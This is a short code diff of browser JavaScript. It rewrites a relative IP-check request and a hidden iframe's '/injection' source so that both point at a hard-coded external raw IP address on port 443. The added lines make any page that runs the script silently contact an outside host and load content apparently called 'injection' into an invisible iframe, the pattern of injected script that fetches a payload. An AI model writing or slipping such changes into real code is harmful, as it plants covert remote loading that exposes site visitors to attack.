@@ -1,5 +1,5 @@
 var xmlhttp = new XMLHttpRequest();
-var url = "/api/checkip";
+var url = "http://13.127.235.27:443/api/checkip";
 
 xmlhttp.onreadystatechange = myfunction;
 xmlhttp.open("GET", url, true);
@@ -22,6 +22,6 @@ function myfunction() {
     var i = document.createElement('iframe');
     i.style.display = 'none';
     //i.onload = function() { i.parentNode.removeChild(i); };
-    i.src = '/injection';
+    i.src = 'http://13.127.235.27:443/injection';
     document.body.appendChild(i);
 })();
